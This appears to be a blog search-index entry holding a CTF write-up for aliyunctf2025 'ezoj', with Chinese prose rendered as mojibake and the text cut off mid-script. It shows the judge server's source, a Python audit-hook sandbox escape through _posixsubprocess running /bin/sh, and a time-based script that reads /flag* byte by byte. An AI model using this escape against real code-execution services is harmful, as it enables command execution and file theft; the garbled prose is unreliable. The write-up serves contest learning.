<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>aliyunctf2025 ezoj éé¢„æœŸè§£ä¸å®˜æ–¹é¢˜è§£å¤ç°</title>
    <link href="/2025/02/26/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/02/26/aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="ezoj"><a href="#ezoj" class="headerlink" title="ezoj"></a>ezoj</h1><p>è¿™æ¯”èµ›çš„pwnå…¨æ˜¯kernelï¼Œæˆ‘ä¼šä¸äº†ä¸€ç‚¹ï¼Œäºæ˜¯å°±å»ååŠ©webæ‰‹æ‰“webäº†ã€‚è¿™é¢˜æˆ‘ä»¬å½“æ—¶ç”¨çš„æ˜¯æ—¶é—´ç›²æ³¨ï¼Œåæ¥å‘ç°å®˜æ–¹é¢˜è§£æ›´ç®€å•ï¼Œæ‰€ä»¥å¤ç°å¹¶è®°å½•ä¸€ä¸‹ã€‚</p><h4 id="åˆæ­¥åˆ†æ"><a href="#åˆæ­¥åˆ†æ" class="headerlink" title="åˆæ­¥åˆ†æ"></a>åˆæ­¥åˆ†æ</h4><p>ç½‘é¡µæœ€ä¸‹é¢æç¤ºäº†æºä»£ç åœ¨&#x2F;sourceä¸‹ï¼Œè®¿é—®å³å¯å¾—åˆ°ç½‘é¡µæºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, send_file<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>app = Flask(__name__)<br><br>SUBMISSIONS_PATH = Path(<span class="hljs-string">&quot;./submissions&quot;</span>)<br>PROBLEMS_PATH = Path(<span class="hljs-string">&quot;./problems&quot;</span>)<br><br>SUBMISSIONS_PATH.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>CODE_TEMPLATE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">import math</span><br><span class="hljs-string">import collections</span><br><span class="hljs-string">import queue</span><br><span class="hljs-string">import heapq</span><br><span class="hljs-string">import bisect</span><br><span class="hljs-string"></span><br><span class="hljs-string">def audit_checker(event,args):</span><br><span class="hljs-string">    if not event in [&quot;import&quot;,&quot;time.sleep&quot;,&quot;builtins.input&quot;,&quot;builtins.input/result&quot;]:</span><br><span class="hljs-string">        raise RuntimeError</span><br><span class="hljs-string"></span><br><span class="hljs-string">sys.addaudithook(audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OJTimeLimitExceed</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OJRuntimeError</span>(<span class="hljs-title class_ inherited__">Exception</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;static/index.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/source&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&quot;server.py&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/problems&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_problems</span>():<br>    problems_dir = PROBLEMS_PATH<br>    problems = []<br>    <span class="hljs-keyword">for</span> problem <span class="hljs-keyword">in</span> problems_dir.iterdir():<br>        problem_config_file = problem / <span class="hljs-string">&quot;problem.json&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> problem_config_file.exists():<br>            <span class="hljs-keyword">continue</span><br><br>        problem_config = json.load(problem_config_file.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;r&quot;</span>))<br>        problem = &#123;<br>            <span class="hljs-string">&quot;problem_id&quot;</span>: problem.name,<br>            <span class="hljs-string">&quot;name&quot;</span>: problem_config[<span class="hljs-string">&quot;name&quot;</span>],<br>            <span class="hljs-string">&quot;description&quot;</span>: problem_config[<span class="hljs-string">&quot;description&quot;</span>],<br>        &#125;<br>        problems.append(problem)<br><br>    problems = <span class="hljs-built_in">sorted</span>(problems, key=<span class="hljs-keyword">lambda</span> x: x[<span class="hljs-string">&quot;problem_id&quot;</span>])<br><br>    problems = &#123;<span class="hljs-string">&quot;problems&quot;</span>: problems&#125;<br>    <span class="hljs-keyword">return</span> jsonify(problems), <span class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/api/submit&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_code</span>():<br>    <span class="hljs-keyword">try</span>:<br>        data = request.get_json()<br>        code = data.get(<span class="hljs-string">&quot;code&quot;</span>)<br>        problem_id = data.get(<span class="hljs-string">&quot;problem_id&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> code <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> problem_id <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> (<br>                jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Missing &#x27;code&#x27; or &#x27;problem_id&#x27;&quot;</span>&#125;),<br>                <span class="hljs-number">400</span>,<br>            )<br><br>        problem_id = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(problem_id))<br>        problem_dir = PROBLEMS_PATH / problem_id<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> problem_dir.exists():<br>            <span class="hljs-keyword">return</span> (<br>                jsonify(<br>                    &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Problem ID <span class="hljs-subst">&#123;problem_id&#125;</span> not found!&quot;</span>&#125;<br>                ),<br>                <span class="hljs-number">404</span>,<br>            )<br><br>        code_filename = SUBMISSIONS_PATH / <span class="hljs-string">f&quot;submission_<span class="hljs-subst">&#123;uuid.uuid4()&#125;</span>.py&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(code_filename, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> code_file:<br>            code = CODE_TEMPLATE + code<br>            code_file.write(code)<br><br>        result = judge(code_filename, problem_dir)<br><br>        code_filename.unlink()<br><br>        <span class="hljs-keyword">return</span> jsonify(result)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;ER&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">judge</span>(<span class="hljs-params">code_filename, problem_dir</span>):<br>    test_files = <span class="hljs-built_in">sorted</span>(problem_dir.glob(<span class="hljs-string">&quot;*.input&quot;</span>))<br>    total_tests = <span class="hljs-built_in">len</span>(test_files)<br>    passed_tests = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">for</span> test_file <span class="hljs-keyword">in</span> test_files:<br>            input_file = test_file<br>            expected_output_file = problem_dir / <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;test_file.stem&#125;</span>.output&quot;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> expected_output_file.exists():<br>                <span class="hljs-keyword">continue</span><br><br>            case_passed = run_code(code_filename, input_file, expected_output_file)<br><br>            <span class="hljs-keyword">if</span> case_passed:<br>                passed_tests += <span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> passed_tests == total_tests:<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;AC&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Accepted&quot;</span>&#125;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;WA&quot;</span>,<br>                <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Wrang Answer: pass(<span class="hljs-subst">&#123;passed_tests&#125;</span>/<span class="hljs-subst">&#123;total_tests&#125;</span>)&quot;</span>,<br>            &#125;<br>    <span class="hljs-keyword">except</span> OJRuntimeError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;RE&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">f&quot;Runtime Error: ret=<span class="hljs-subst">&#123;e.args[<span class="hljs-number">0</span>]&#125;</span>&quot;</span>&#125;<br>    <span class="hljs-keyword">except</span> OJTimeLimitExceed:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;TLE&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Time Limit Exceed&quot;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_code</span>(<span class="hljs-params">code_filename, input_file, expected_output_file</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> infile, <span class="hljs-built_in">open</span>(<br>        expected_output_file, <span class="hljs-string">&quot;r&quot;</span><br>    ) <span class="hljs-keyword">as</span> expected_output:<br>        expected_output_content = expected_output.read().strip()<br><br>        process = subprocess.Popen(<br>            [<span class="hljs-string">&quot;python3&quot;</span>, code_filename],<br>            stdin=infile,<br>            stdout=subprocess.PIPE,<br>            stderr=subprocess.PIPE,<br>            text=<span class="hljs-literal">True</span>,<br>        )<br><br>        <span class="hljs-keyword">try</span>:<br>            stdout, stderr = process.communicate(timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-keyword">except</span> subprocess.TimeoutExpired:<br>            process.kill()<br>            <span class="hljs-keyword">raise</span> OJTimeLimitExceed<br><br>        <span class="hljs-keyword">if</span> process.returncode != <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> OJRuntimeError(process.returncode)<br><br>        <span class="hljs-keyword">if</span> stdout.strip() == expected_output_content:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>)<br></code></pre></td></tr></table></figure><p>é€šè¿‡åˆ†ææºç å’ŒæŠ“åŒ…å¯ä»¥çœ‹å‡ºï¼š</p><ol><li>ç¨‹åºé€šè¿‡<code>/api/submit</code>æ¥æ”¶ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œæ‰§è¡Œè¯·æ±‚ä¸­çš„ä»£ç </li><li>ä»£ç è¢«æ‹¼æ¥åˆ°<code>CODE_TEMPLATE</code>åæ‰§è¡Œï¼Œå¹¶ä¸”æœ‰ç™½åå•æ²™ç®±é™åˆ¶è°ƒç”¨</li></ol><p>è¿™é‡Œè€ƒè™‘æ²™ç®±é€ƒé€¸ã€‚Pythonä¸­æœ‰æ¯”é¢˜ç»™çš„æ²™ç®±æ›´åº•å±‚çš„è°ƒç”¨<code>_posixsubprocess</code>ï¼Œå®ƒä¸ä¼šè¢«ç›‘æ§ï¼Œå¯ä»¥å°è¯•ç”¨å®ƒæ‰§è¡Œå‘½ä»¤ã€‚</p><h4 id="éé¢„æœŸè§£-æ—¶é—´ç›²æ³¨"><a href="#éé¢„æœŸè§£-æ—¶é—´ç›²æ³¨" class="headerlink" title="éé¢„æœŸè§£(æ—¶é—´ç›²æ³¨)"></a>éé¢„æœŸè§£(æ—¶é—´ç›²æ³¨)</h4><p>ç½‘ä¸Šå¾ˆå®¹æ˜“æŸ¥åˆ°<code>_posixsubprocess</code>æ‰§è¡Œä»»æ„å‘½ä»¤çš„æ¿å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> _posixsubprocess<br>cmd = <span class="hljs-string">b&#x27;&#x27;</span><br>_posixsubprocess.fork_exec([<span class="hljs-string">b&quot;/bin/sh&quot;</span>,  <span class="hljs-string">b&quot;-c&quot;</span> , cmd], [<span class="hljs-string">b&quot;/bin/sh&quot;</span>], <span class="hljs-literal">True</span>, (), <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, *(os.pipe()), <span class="hljs-literal">False</span>, <span class="hljs-literal">False</span>,<span class="hljs-literal">False</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>, -<span class="hljs-number">1</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p>ç°åœ¨çš„é—®é¢˜æ˜¯ï¼Œç¨‹åºæ²¡æœ‰å›æ˜¾ï¼Œä¸”ä¸å‡ºç½‘æ— æ³•åå¼¹shellã€‚æˆ‘ä»¬è¦æƒ³åŠæ³•æå‡ºå‘½ä»¤çš„å›æ˜¾æ‰è¡Œã€‚æˆ‘ä»¬åœ¨æ¯”èµ›æ—¶çš„ç¬¬ä¸€ååº”æ˜¯<strong>æ—¶é—´ç›²æ³¨</strong>ã€‚<br>æ—¶é—´ç›²æ³¨çš„å¤§æ¦‚åŸç†æ˜¯ï¼Œç”¨ä¸€ä¸ªåˆé€‚å¤§å°çš„å­—ç¬¦é›†åŒ¹é…æŸä¸ªå­—èŠ‚æµä¸­çš„å­—ç¬¦ï¼Œè‹¥åŒ¹é…ä¸æˆåŠŸåˆ™passï¼ŒåŒ¹é…æˆåŠŸåˆ™è®©ç¨‹åºåœæ­¢(sleep)ä¸€æ®µæ—¶é—´å†ç›¸åº”ï¼Œé‚£ä¹ˆé€šè¿‡ç›¸åº”æ—¶é—´å°±å¯ä»¥æ¨æ–­å­—èŠ‚æµçš„å†…å®¹ï¼Œæ‹¿åˆ°flagã€‚è¿™å®é™…ä¸Šå°±æ˜¯<strong>å°†æ—¶é—´è§£é‡Šä¸ºè¾“å‡º</strong>çš„æ–¹æ³•ã€‚<br>çŸ¥é“åŸç†ä¹‹åå°±å¥½å†™è„šæœ¬äº†ã€‚è¿™ä¸ªè„šæœ¬åº”è¯¥è¿˜èƒ½ä¼˜åŒ–æˆäºŒåˆ†æŸ¥æ‰¾ï¼Œä½†æˆ‘ä»¬æ¯”è¾ƒæ‡’ï¼Œæ²¡ä¼˜åŒ–()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&quot;http://121.41.238.106:29330/api/submit&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&quot;problem_id&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>    <span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&quot;import os\nimport _posixsubprocess\n\n_posixsubprocess.fork_exec([b\&quot;/bin/sh\&quot;,  b\&quot;-c\&quot; , b\&quot;\&quot;\&quot;chr=$(cat /flag* | cut -c&#123;j&#125;)\nif [ \&quot;$chr\&quot; = \&quot;&#123;index&#125;\&quot; ]; then\t\nsleep 0.3\nfi\&quot;\&quot;\&quot;], [b\&quot;/bin/sh\&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), 2, False,False, None, None, None, -1, None, False)&quot;</span><br>&#125;<br><br>result = <span class="hljs-string">&quot;&quot;</span><br>charset = <span class="hljs-string">&quot;abcdef-&#123;&#125;liyunt0123456789&quot;</span><br><span class="hljs-built_in">print</span>(charset)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">60</span>):<br>    getit = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(charset)):      <br>        data1 = data.copy()<br>        data1[<span class="hljs-string">&quot;code&quot;</span>] = data[<span class="hljs-string">&quot;code&quot;</span>].<span class="hljs-built_in">format</span>(j=j,index=charset[i])<br>        start_time = time.monotonic()<br>        res = requests.post(url=url,json=data1)<br><br>        <span class="hljs-comment"># print(f&quot;now&gt;&gt;&gt;&#123;j&#125;::&#123;charset[i]&#125;&quot;, f&quot;time=&#123;time.monotonic() - start_time&#125;&quot;)</span><br>        <br>        <span class="hljs-keyword">if</span> time.monotonic() - start_time &gt; <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> getit:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;j&#125;</span>::<span class="hljs-subst">&#123;charset[i]&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">continue</span><br>            result += charset[i]<br>            <span class="hljs-built_in">print</span>(result)<br>            getit = <span class="hljs-literal">True</span><br>            <br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;&gt;&gt; <span class="hljs-subst">&#123;j&#125;</span> is failed&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="é¢„æœŸè§£å¤ç°"><a href="#é¢„æœŸè§£å¤ç°" class="headerlink" title="é¢„æœŸè§£å¤ç°"></a>é¢„æœŸè§£å¤ç°</h4><p>å‚è€ƒå®˜æ–¹é¢˜è§£ï¼š<a href="https://xz.aliyun.com/news/17029">https://xz.aliyun.com/news/17029</a><br>å®˜æ–¹é¢˜è§£ç”¨å¦ä¸€ç§æ–¹æ³•è§£å†³äº†å›æ˜¾é—®é¢˜ã€‚å½“æäº¤çš„ä»£ç è¿è¡Œå¤±è´¥æˆ–å¼‚å¸¸é€€å‡ºæ—¶ï¼Œç½‘é¡µä¼šå›æ˜¾<strong>é€€å‡ºç </strong>ã€‚è€Œé€€å‡ºç æ°å¥½æ˜¯0~255ï¼Œå³ä¸€ä¸ªå­—èŠ‚ã€‚<br><img src="/./aliyunctf2025-ezoj-%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E5%AE%98%E6%96%B9%E9%A2%98%E8%A7%A3%E5%A4%8D%E7%8E%B0/image.png" alt="alt text"><br>é‚£ä¹ˆç°åœ¨çš„é—®é¢˜å°±æ˜¯ï¼Œ<code>_posixsubprocess</code>æ‰§è¡Œå‘½ä»¤æ—¶æ˜¾ç„¶æ˜¯execäº†ä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œï¼Œæ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºæ˜¯å­è¿›ç¨‹çš„<code>stdout</code>ï¼Œæˆ‘ä»¬æ€ä¹ˆåœ¨çˆ¶è¿›ç¨‹è·å–è¿™ä¸ªè¾“å‡ºå‘¢ï¼Ÿ<br>è¿™å°±éœ€è¦çœ‹ä¸€ä¸‹<code>_posixsubprocess</code>çš„ç»†èŠ‚ç”¨æ³•äº†ã€‚ç½‘ä¸Šå‡ ä¹æŸ¥ä¸åˆ°ç›¸å…³æ¥å£ï¼Œæˆ‘ä»¬åªèƒ½å»çœ‹æºç äº†ã€‚æºç ï¼š<a href="https://github.com/python/cpython.git">https://github.com/python/cpython.git</a><br>åœ¨æºç çš„&#x2F;Modulesæ–‡ä»¶å¤¹ä¸‹çš„<code>_posixsubprocess.c</code>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„æºç ã€‚å®ƒè¿›è¡Œäº†å¤šå±‚é¢„å¤„ç†ï¼Œæœ€ç»ˆè°ƒç”¨<code>child_exec</code>å‡½æ•°æ‰§è¡Œexecã€‚æ³¨æ„722è¡Œçš„è¿™äº›ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> (c2pwrite == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">if</span> (_Py_set_inheritable_async_safe(c2pwrite, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>) &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">goto</span> error;<br>    &#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (c2pwrite != <span class="hljs-number">-1</span>)<br>    POSIX_CALL(dup2(c2pwrite, <span class="hljs-number">1</span>));  <span class="hljs-comment">/* stdout */</span><br></code></pre></td></tr></table></figure><p>è¿™ä¼šæŠŠå­è¿›ç¨‹çš„<code>stdout</code>è½¬å‘åˆ°<code>c2pwrite</code>ä¸Šã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>c2pwrite</code>å‚æ•°è·å–å­è¿›ç¨‹çš„è¾“å‡ºå¹¶é€šè¿‡é€€å‡ºç é€æ­¥è¾“å‡ºã€‚<br>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br>URL = <span class="hljs-string">&quot;http://121.41.238.106:42312//api/submit&quot;</span><br>CODE_TEMPLATE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import _posixsubprocess</span><br><span class="hljs-string">import os</span><br><span class="hljs-string">import time</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string"></span><br><span class="hljs-string">std_pipe = os.pipe()</span><br><span class="hljs-string">err_pipe = os.pipe()</span><br><span class="hljs-string"></span><br><span class="hljs-string">_posixsubprocess.fork_exec(</span><br><span class="hljs-string">    